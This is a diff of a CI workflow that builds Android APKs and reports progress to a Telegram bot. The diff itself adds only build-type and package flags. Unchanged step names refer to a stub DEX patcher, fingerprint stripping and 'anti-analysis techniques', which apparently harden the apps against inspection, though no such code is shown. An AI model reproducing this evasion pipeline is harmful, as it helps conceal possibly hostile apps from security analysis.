@@ -81,6 +81,10 @@ jobs:
 
     steps:
 
+      # ── 0. Record build start timestamp (for real elapsed/ETA) ───────────────
+      - name: Record build start time
+        run: echo "BUILD_START_TS=$(date +%s)" >> $GITHUB_ENV
+
       # ── 1. Checkout dev branch ───────────────────────────────────────────────
       - name: Checkout dev branch
         uses: actions/checkout@v4
@@ -106,7 +110,8 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" || true
 
       # ── 2. Install tools ─────────────────────────────────────────────────────
       - name: Install tools
@@ -154,7 +159,8 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" || true
 
       # ── 2a. Download custom icon from Telegram (if custom template) ───────────
       - name: Download custom icon from Telegram
@@ -291,7 +297,8 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" || true
 
       - name: Inject Nova package name into source
         if: ${{ github.event.inputs.build_type != 'companion_only' }}
@@ -352,7 +359,9 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" \
+            --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}" || true
 
       # ── 6. Setup Android SDK ──────────────────────────────────────────────────
       - name: Setup Android SDK
@@ -415,7 +424,9 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" \
+            --pkg       "${{ steps.nova_pkg.outputs.MOD_PKG }}" || true
 
       # ── 7. Cache Gradle wrapper ───────────────────────────────────────────────
       - name: Cache Gradle wrapper
@@ -499,7 +510,9 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" \
+            --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}" || true
 
       # ── 8c. Phase 3 Step 27 — Nova Stub DEX patcher ─────────────────────────
       - name: "Phase 3 | Step 27 — Nova Stub DEX patcher"
@@ -628,7 +641,9 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" \
+            --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}" || true
 
       - name: "Phase 2 | Re-sign Nova after Phase 2 patches"
         if: ${{ github.event.inputs.build_type != 'companion_only' }}
@@ -657,7 +672,9 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" \
+            --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}" || true
 
       # ── Step 5+7 — Strip fingerprints + all 6 anti-analysis techniques ────────
       - name: "Step 5+7 | Strip fingerprints + deflate fix + r8 decoy (Nova)"
@@ -723,7 +740,9 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" \
+            --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}" || true
 
       # ── 9. Show APK info ──────────────────────────────────────────────────────
       - name: Show APK info
@@ -755,7 +774,9 @@ jobs:
             --client    "0" \
             --chat-id   "${{ github.event.inputs.build_chat_id }}" \
             --msg-id    "${{ github.event.inputs.build_message_id }}" \
-            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --build-type "${{ github.event.inputs.build_type || 'full' }}" \
+            --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}" || true
 
       # ── 11. Upload Nova APK artifact (full build only) ───────────────────────
       - name: Upload Nova APK artifact
@@ -795,7 +816,8 @@ jobs:
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
             --apk       "$APK" \
             --apk-size  "$SIZE" \
-            --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+                        --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}" \
+            --build-type "full"
 
       # ── 11d. Send companion APK to Telegram (companion_only build) ───────────
       - name: Send DEV Companion APK to Telegram (companion_only)
@@ -818,7 +840,8 @@ jobs:
             --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
             --apk       "$APK" \
             --apk-size  "$SIZE" \
-            --pkg       "${{ steps.nova_pkg.outputs.MOD_PKG }}"
+                        --pkg       "${{ steps.nova_pkg.outputs.MOD_PKG }}" \
+            --build-type "companion_only"
 
       # ── 12. Collect + upload error logs (on failure) ──────────────────────────
       - name: Collect error logs
